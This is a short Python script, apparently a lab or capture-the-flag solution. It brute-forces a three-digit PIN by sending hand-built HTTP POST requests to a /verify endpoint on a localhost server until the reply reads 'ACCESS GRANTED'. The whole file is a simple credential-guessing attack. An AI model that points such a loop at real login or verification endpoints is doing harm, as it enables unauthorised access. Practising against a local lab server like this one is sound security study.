import socket
import time

HOST = '127.0.0.1'  # localhost address (the server is running on the same machine)
PORT = 8888 # port number where the server is listening

def send_pin(pin):
    # Create the body of the POST request
    body = f'magicNumber={pin}' 
    
    # Create the POST request manually
    request = ( 
        f"POST /verify HTTP/1.1\r\n" 
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n" 
        f"Content-Length: {len(body)}\r\n" 
        f"Connection: close\r\n" 
        f"\r\n"
        f"{body}" 
    )
    # Create a new socket for each request
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: 
        s.connect((HOST, PORT)) 
        s.sendall(request.encode()) 
        response = s.recv(4096) 
        return response.decode() 
    
for pin in range(1000): # Loop through all possible 3-digit PINs (000 to 999)
    pin_str = f"{pin:03d}" # Format the pin as a 3-digit string
    print(f"Trying pin {pin_str}") # Print the current pin being tried
    response = send_pin(pin_str)

    if "ACCESS GRANTED" in response: # Check if the response contains "ACCESS GRANTED"
        print(f"\nSUCCESS! The correct PIN is {pin_str}") # Print the successful pin
        break # Exit the loop if the correct pin is found
    else:
        time.sleep(1)  # Respect the server's 1 second wait
    